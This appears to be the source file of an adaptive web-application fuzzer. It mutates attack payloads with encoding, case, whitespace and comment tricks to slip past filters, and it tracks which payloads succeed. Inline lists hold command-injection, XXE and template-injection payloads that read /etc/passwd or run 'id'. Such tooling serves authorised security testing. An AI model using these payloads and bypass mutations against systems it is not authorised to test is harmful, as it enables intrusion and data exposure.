import { SQL_PAYLOADS, XSS_PAYLOADS, LFI_PAYLOADS, SSRF_PAYLOADS } from "../payloads";

export interface FuzzContext {
  type: "url" | "header" | "body" | "json" | "xml" | "cookie";
  contentType?: string;
  encoding?: string;
  reflection?: boolean;
}

export interface PayloadStats {
  category: string;
  attempted: number;
  triggered: number;
  successRate: number;
  stopped: boolean;
  stopReason?: string;
}

interface ResponsePattern {
  hash: string;
  count: number;
  lastPayload: string;
}

interface CategoryTracker {
  category: string;
  consecutiveSameResponses: number;
  lastResponseHash: string;
  successfulPayloads: string[];
  attemptedPayloads: string[];
  triggeredCount: number;
  stopped: boolean;
  stopReason?: string;
}

const CONSECUTIVE_SAME_RESPONSE_THRESHOLD = 10;
const MIN_ATTEMPTS_BEFORE_STOP = 15;
const STOP_SUCCESS_RATE_THRESHOLD = 0;

const categoryTrackers: Map<string, CategoryTracker> = new Map();

function urlEncode(str: string): string {
  return encodeURIComponent(str);
}

function doubleUrlEncode(str: string): string {
  return encodeURIComponent(encodeURIComponent(str));
}

function tripleUrlEncode(str: string): string {
  return encodeURIComponent(encodeURIComponent(encodeURIComponent(str)));
}

function unicodeEncode(str: string): string {
  return str.split("").map(c => {
    const code = c.charCodeAt(0);
    if (code < 128) {
      return `\\u${code.toString(16).padStart(4, "0")}`;
    }
    return c;
  }).join("");
}

function unicodeEscapeHtml(str: string): string {
  return str.split("").map(c => `&#x${c.charCodeAt(0).toString(16)};`).join("");
}

function utf8OverlongEncode(str: string): string {
  const replacements: Record<string, string> = {
    "/": "%c0%af",
    ".": "%c0%ae",
    "\\": "%c1%9c",
  };
  let result = str;
  for (const [char, encoded] of Object.entries(replacements)) {
    result = result.split(char).join(encoded);
  }
  return result;
}

function base64Encode(str: string): string {
  return Buffer.from(str).toString("base64");
}

function base64Wrap(str: string): string {
  return `${base64Encode(str)}`;
}

function htmlEntityEncode(str: string): string {
  return str.split("").map(c => `&#${c.charCodeAt(0)};`).join("");
}

function htmlEntityHexEncode(str: string): string {
  return str.split("").map(c => `&#x${c.charCodeAt(0).toString(16)};`).join("");
}

function htmlEntityNamedEncode(str: string): string {
  const named: Record<string, string> = {
    "<": "&lt;",
    ">": "&gt;",
    "&": "&amp;",
    '"': "&quot;",
    "'": "&apos;",
  };
  return str.split("").map(c => named[c] || c).join("");
}

function toUpperCase(str: string): string {
  return str.toUpperCase();
}

function toLowerCase(str: string): string {
  return str.toLowerCase();
}

function toMixedCase(str: string): string {
  return str.split("").map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join("");
}

function toRandomCase(str: string): string {
  return str.split("").map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join("");
}

function addSpaces(str: string): string {
  return str.split("").join(" ");
}

function addTabs(str: string): string {
  return str.replace(/ /g, "\t");
}

function addNewlines(str: string): string {
  return str.replace(/ /g, "\n");
}

function addCarriageReturns(str: string): string {
  return str.replace(/ /g, "\r\n");
}

function addNullBytes(str: string): string {
  return str.split("").join("%00");
}

function addSqlComment(str: string): string {
  return str.replace(/ /g, "/**/");
}

function addSqlLineComment(str: string): string {
  return `${str}-- `;
}

function addSqlHashComment(str: string): string {
  return `${str}#`;
}

function addHtmlComment(str: string): string {
  return `<!--${str}-->`;
}

function addJsComment(str: string): string {
  return `/*${str}*/`;
}

function addJsLineComment(str: string): string {
  return `//${str}\n`;
}

function wrapInSqlComment(str: string): string {
  return str.replace(/(\s+)/g, "/**/$1/**/");
}

const MUTATION_FUNCTIONS: Record<string, (str: string) => string> = {
  "url-encode": urlEncode,
  "double-url-encode": doubleUrlEncode,
  "triple-url-encode": tripleUrlEncode,
  "unicode": unicodeEncode,
  "unicode-html": unicodeEscapeHtml,
  "utf8-overlong": utf8OverlongEncode,
  "base64": base64Encode,
  "base64-wrap": base64Wrap,
  "html-entity": htmlEntityEncode,
  "html-entity-hex": htmlEntityHexEncode,
  "html-entity-named": htmlEntityNamedEncode,
  "uppercase": toUpperCase,
  "lowercase": toLowerCase,
  "mixed-case": toMixedCase,
  "random-case": toRandomCase,
  "spaces": addSpaces,
  "tabs": addTabs,
  "newlines": addNewlines,
  "crlf": addCarriageReturns,
  "null-bytes": addNullBytes,
  "sql-comment": addSqlComment,
  "sql-line-comment": addSqlLineComment,
  "sql-hash-comment": addSqlHashComment,
  "html-comment": addHtmlComment,
  "js-comment": addJsComment,
  "js-line-comment": addJsLineComment,
  "sql-comment-wrap": wrapInSqlComment,
};

export function mutatePayload(payload: string, mutations: string[]): string[] {
  const results: string[] = [payload];
  
  for (const mutation of mutations) {
    const mutationFn = MUTATION_FUNCTIONS[mutation];
    if (mutationFn) {
      try {
        results.push(mutationFn(payload));
      } catch {
        continue;
      }
    }
  }
  
  return Array.from(new Set(results));
}

function getMutationsForContext(context: FuzzContext): string[] {
  const mutations: string[] = [];
  
  switch (context.type) {
    case "url":
      mutations.push("url-encode", "double-url-encode", "triple-url-encode");
      mutations.push("utf8-overlong");
      break;
    case "header":
      mutations.push("url-encode", "base64");
      mutations.push("crlf", "newlines");
      break;
    case "body":
      if (context.contentType?.includes("json")) {
        mutations.push("unicode", "base64");
      } else if (context.contentType?.includes("xml")) {
        mutations.push("html-entity", "html-entity-hex");
      } else {
        mutations.push("url-encode", "html-entity");
      }
      break;
    case "json":
      mutations.push("unicode", "base64");
      break;
    case "xml":
      mutations.push("html-entity", "html-entity-hex", "unicode-html");
      break;
    case "cookie":
      mutations.push("url-encode", "base64");
      break;
  }
  
  if (context.reflection) {
    mutations.push("html-entity", "html-entity-hex", "unicode-html");
  }
  
  return mutations;
}

function getRelevantPayloads(vulnType: string): string[] {
  switch (vulnType.toLowerCase()) {
    case "sqli":
    case "sql":
    case "sql-injection":
      return [
        ...SQL_PAYLOADS.errorBased,
        ...SQL_PAYLOADS.unionBased,
        ...SQL_PAYLOADS.timeBased.slice(0, 5),
        ...SQL_PAYLOADS.booleanBased,
      ];
    case "xss":
    case "cross-site-scripting":
      return [
        ...XSS_PAYLOADS.polyglot,
        ...XSS_PAYLOADS.reflected,
        ...XSS_PAYLOADS.filterBypass,
      ];
    case "lfi":
    case "local-file-inclusion":
    case "path-traversal":
      return [
        ...LFI_PAYLOADS.basic,
        ...LFI_PAYLOADS.nullByte,
        ...LFI_PAYLOADS.phpWrappers,
      ];
    case "ssrf":
    case "server-side-request-forgery":
      return [
        ...SSRF_PAYLOADS.internal,
        ...SSRF_PAYLOADS.cloudMetadata,
        ...SSRF_PAYLOADS.protocols,
        ...SSRF_PAYLOADS.bypass,
      ];
    case "rce":
    case "command-injection":
      return [
        "; id",
        "| id",
        "|| id",
        "&& id",
        "$(id)",
        "`id`",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; whoami",
        "| whoami",
        "& dir",
        "| dir",
        "; ls -la",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
      ];
    case "xxe":
    case "xml-external-entity":
      return [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      ];
    case "ssti":
    case "template-injection":
      return [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "@(7*7)",
        "{{config}}",
        "{{self}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
      ];
    default:
      return [];
  }
}

function isPayloadRelevantForContext(payload: string, context: FuzzContext, vulnType: string): boolean {
  if (context.contentType?.includes("image") || 
      context.contentType?.includes("audio") || 
      context.contentType?.includes("video")) {
    if (["sqli", "sql", "sql-injection", "xss", "ssti"].includes(vulnType.toLowerCase())) {
      return false;
    }
  }
  
  if (context.type === "json" && vulnType.toLowerCase().includes("xxe")) {
    return false;
  }
  
  if (context.type === "cookie") {
    if (payload.length > 4096) {
      return false;
    }
  }
  
  if (context.type === "header") {
    if (payload.includes("\n") && !payload.includes("%0a") && !payload.includes("%0d")) {
      return false;
    }
  }
  
  return true;
}

export function selectPayloadsForContext(ctx: FuzzContext, vulnType: string): string[] {
  const basePayloads = getRelevantPayloads(vulnType);
  
  const filteredPayloads = basePayloads.filter(p => isPayloadRelevantForContext(p, ctx, vulnType));
  
  const mutations = getMutationsForContext(ctx);
  
  const allPayloads: Set<string> = new Set();
  
  for (const payload of filteredPayloads) {
    allPayloads.add(payload);
  }
  
  const priorityPayloads = filteredPayloads.slice(0, Math.min(10, filteredPayloads.length));
  for (const payload of priorityPayloads) {
    const mutated = mutatePayload(payload, mutations);
    for (const m of mutated) {
      allPayloads.add(m);
    }
  }
  
  return Array.from(allPayloads);
}

function simpleHash(str: string): string {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    const char = str.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash;
  }
  return Math.abs(hash).toString(16);
}

function getOrCreateTracker(category: string): CategoryTracker {
  if (!categoryTrackers.has(category)) {
    categoryTrackers.set(category, {
      category,
      consecutiveSameResponses: 0,
      lastResponseHash: "",
      successfulPayloads: [],
      attemptedPayloads: [],
      triggeredCount: 0,
      stopped: false,
    });
  }
  return categoryTrackers.get(category)!;
}

export function recordPayloadResult(
  category: string,
  payload: string,
  responseBody: string,
  triggered: boolean,
  onLog?: (level: string, message: string) => Promise<void>
): void {
  const tracker = getOrCreateTracker(category);
  
  if (tracker.stopped) {
    return;
  }
  
  tracker.attemptedPayloads.push(payload);
  
  if (triggered) {
    tracker.triggeredCount++;
    tracker.successfulPayloads.push(payload);
    tracker.consecutiveSameResponses = 0;
    tracker.lastResponseHash = "";
  } else {
    const responseHash = simpleHash(responseBody);
    
    if (responseHash === tracker.lastResponseHash) {
      tracker.consecutiveSameResponses++;
    } else {
      tracker.consecutiveSameResponses = 1;
      tracker.lastResponseHash = responseHash;
    }
    
    if (tracker.consecutiveSameResponses >= CONSECUTIVE_SAME_RESPONSE_THRESHOLD) {
      const successRate = tracker.attemptedPayloads.length > 0 
        ? (tracker.triggeredCount / tracker.attemptedPayloads.length) * 100 
        : 0;
      
      if (successRate <= STOP_SUCCESS_RATE_THRESHOLD && 
          tracker.attemptedPayloads.length >= MIN_ATTEMPTS_BEFORE_STOP) {
        tracker.stopped = true;
        tracker.stopReason = `Stopped after ${tracker.consecutiveSameResponses} consecutive identical responses with 0% success rate (${tracker.attemptedPayloads.length} attempts, ${tracker.triggeredCount} triggers)`;
        
        if (onLog) {
          onLog("info", `[Fuzzer] Auto-stopping category '${category}': ${tracker.stopReason}`);
        }
      }
    }
  }
}

export function shouldContinueFuzzing(stats: PayloadStats): boolean {
  if (stats.stopped) {
    return false;
  }
  
  if (stats.attempted >= MIN_ATTEMPTS_BEFORE_STOP && 
      stats.successRate === STOP_SUCCESS_RATE_THRESHOLD) {
    return false;
  }
  
  return true;
}

export function getPayloadStats(): PayloadStats[] {
  const stats: PayloadStats[] = [];
  
  categoryTrackers.forEach((tracker, category) => {
    const successRate = tracker.attemptedPayloads.length > 0 
      ? (tracker.triggeredCount / tracker.attemptedPayloads.length) * 100 
      : 0;
    
    stats.push({
      category,
      attempted: tracker.attemptedPayloads.length,
      triggered: tracker.triggeredCount,
      successRate: Math.round(successRate * 100) / 100,
      stopped: tracker.stopped,
      stopReason: tracker.stopReason,
    });
  });
  
  return stats;
}

export function getCategoryStats(category: string): PayloadStats | null {
  const tracker = categoryTrackers.get(category);
  if (!tracker) {
    return null;
  }
  
  const successRate = tracker.attemptedPayloads.length > 0 
    ? (tracker.triggeredCount / tracker.attemptedPayloads.length) * 100 
    : 0;
  
  return {
    category,
    attempted: tracker.attemptedPayloads.length,
    triggered: tracker.triggeredCount,
    successRate: Math.round(successRate * 100) / 100,
    stopped: tracker.stopped,
    stopReason: tracker.stopReason,
  };
}

export function isCategoryStopped(category: string): boolean {
  const tracker = categoryTrackers.get(category);
  return tracker?.stopped ?? false;
}

export function resetCategoryStats(category?: string): void {
  if (category) {
    categoryTrackers.delete(category);
  } else {
    categoryTrackers.clear();
  }
}

export function getSuccessfulPayloads(category: string): string[] {
  const tracker = categoryTrackers.get(category);
  return tracker?.successfulPayloads ?? [];
}

export function getSimilarPayloads(successfulPayload: string, vulnType: string): string[] {
  const allPayloads = getRelevantPayloads(vulnType);
  const similar: string[] = [];
  
  const normalizedSuccess = successfulPayload.toLowerCase().replace(/\s+/g, " ");
  
  for (const payload of allPayloads) {
    if (payload === successfulPayload) continue;
    
    const normalizedPayload = payload.toLowerCase().replace(/\s+/g, " ");
    
    let matchScore = 0;
    const successTokens = normalizedSuccess.split(/[^a-z0-9]+/);
    const payloadTokens = normalizedPayload.split(/[^a-z0-9]+/);
    
    for (const token of successTokens) {
      if (token.length > 2 && payloadTokens.includes(token)) {
        matchScore++;
      }
    }
    
    if (matchScore >= 2 || 
        (normalizedPayload.includes(normalizedSuccess.slice(0, 10)) && normalizedSuccess.length >= 10)) {
      similar.push(payload);
    }
  }
  
  return similar.slice(0, 20);
}

export function prioritizePayloads(
  payloads: string[],
  category: string,
  vulnType: string
): string[] {
  const tracker = categoryTrackers.get(category);
  
  if (!tracker || tracker.successfulPayloads.length === 0) {
    return payloads;
  }
  
  const prioritized: string[] = [];
  const remaining: string[] = [];
  
  const similarPayloads = new Set<string>();
  for (const successful of tracker.successfulPayloads) {
    const similar = getSimilarPayloads(successful, vulnType);
    for (const s of similar) {
      similarPayloads.add(s);
    }
  }
  
  for (const payload of payloads) {
    if (similarPayloads.has(payload) && !tracker.attemptedPayloads.includes(payload)) {
      prioritized.push(payload);
    } else if (!tracker.attemptedPayloads.includes(payload)) {
      remaining.push(payload);
    }
  }
  
  return [...prioritized, ...remaining];
}

export interface AdaptiveFuzzerOptions {
  category: string;
  vulnType: string;
  context: FuzzContext;
  onLog?: (level: string, message: string) => Promise<void>;
}

export class AdaptiveFuzzer {
  private category: string;
  private vulnType: string;
  private context: FuzzContext;
  private onLog?: (level: string, message: string) => Promise<void>;
  private payloadQueue: string[];
  private currentIndex: number;
  
  constructor(options: AdaptiveFuzzerOptions) {
    this.category = options.category;
    this.vulnType = options.vulnType;
    this.context = options.context;
    this.onLog = options.onLog;
    this.payloadQueue = [];
    this.currentIndex = 0;
    
    this.initializePayloads();
  }
  
  private initializePayloads(): void {
    const payloads = selectPayloadsForContext(this.context, this.vulnType);
    this.payloadQueue = prioritizePayloads(payloads, this.category, this.vulnType);
  }
  
  hasMore(): boolean {
    if (isCategoryStopped(this.category)) {
      return false;
    }
    return this.currentIndex < this.payloadQueue.length;
  }
  
  getNext(): string | null {
    if (!this.hasMore()) {
      return null;
    }
    return this.payloadQueue[this.currentIndex++];
  }
  
  recordResult(payload: string, responseBody: string, triggered: boolean): void {
    recordPayloadResult(this.category, payload, responseBody, triggered, this.onLog);
    
    if (triggered) {
      const similar = getSimilarPayloads(payload, this.vulnType);
      const newPayloads = similar.filter(s => 
        !this.payloadQueue.includes(s) && 
        !getOrCreateTracker(this.category).attemptedPayloads.includes(s)
      );
      
      if (newPayloads.length > 0) {
        const insertPosition = this.currentIndex;
        this.payloadQueue.splice(insertPosition, 0, ...newPayloads.slice(0, 5));
      }
    }
  }
  
  getStats(): PayloadStats {
    return getCategoryStats(this.category) || {
      category: this.category,
      attempted: 0,
      triggered: 0,
      successRate: 0,
      stopped: false,
    };
  }
  
  getRemainingCount(): number {
    return Math.max(0, this.payloadQueue.length - this.currentIndex);
  }
}

export function generateAllMutations(payload: string): string[] {
  const allMutations = Object.keys(MUTATION_FUNCTIONS);
  return mutatePayload(payload, allMutations);
}

export function generateEncodingVariants(payload: string): string[] {
  const encodingMutations = [
    "url-encode",
    "double-url-encode",
    "triple-url-encode",
    "unicode",
    "unicode-html",
    "utf8-overlong",
    "base64",
    "html-entity",
    "html-entity-hex",
  ];
  return mutatePayload(payload, encodingMutations);
}

export function generateCaseVariants(payload: string): string[] {
  const caseMutations = [
    "uppercase",
    "lowercase",
    "mixed-case",
    "random-case",
  ];
  return mutatePayload(payload, caseMutations);
}

export function generateWhitespaceVariants(payload: string): string[] {
  const whitespaceMutations = [
    "spaces",
    "tabs",
    "newlines",
    "crlf",
    "null-bytes",
  ];
  return mutatePayload(payload, whitespaceMutations);
}

export function generateCommentVariants(payload: string): string[] {
  const commentMutations = [
    "sql-comment",
    "sql-line-comment",
    "sql-hash-comment",
    "html-comment",
    "js-comment",
    "js-line-comment",
    "sql-comment-wrap",
  ];
  return mutatePayload(payload, commentMutations);
}
